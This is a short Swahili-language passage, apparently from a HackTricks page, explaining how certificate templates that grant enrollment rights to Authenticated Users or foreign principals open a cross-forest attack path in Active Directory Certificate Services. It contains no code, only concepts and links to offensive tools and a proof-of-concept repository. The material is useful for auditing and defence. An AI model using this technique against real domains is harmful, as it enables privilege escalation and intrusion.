Katika mazingira ya multi-forest, tahadhari inahitajika kuhusu Enterprise CAs ambazo **huchapisha certificate templates** zinazoruhusu **Authenticated Users au foreign principals** (users/groups walio nje ya forest ambayo Enterprise CA ni sehemu yake) kuwa na **enrollment na edit rights**.\
Baada ya authentication kuvuka trust, **Authenticated Users SID** huongezwa kwenye token ya user na AD. Kwa hiyo, ikiwa domain ina Enterprise CA yenye template ambayo **inaruhusu Authenticated Users enrollment rights**, template inaweza uwezekano **ku-enrolliwa na user kutoka forest nyingine**. Vilevile, ikiwa **enrollment rights zimepewa foreign principal waziwazi na template**, **cross-forest access-control relationship** huundwa kwa njia hiyo, na kumwezesha principal kutoka forest moja **ku-enroll katika template kutoka forest nyingine**.

Matukio yote mawili husababisha **ongezeko la attack surface** kutoka forest moja hadi nyingine. Settings za certificate template zinaweza kutumiwa na attacker kupata privileges za ziada katika foreign domain.


## References

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
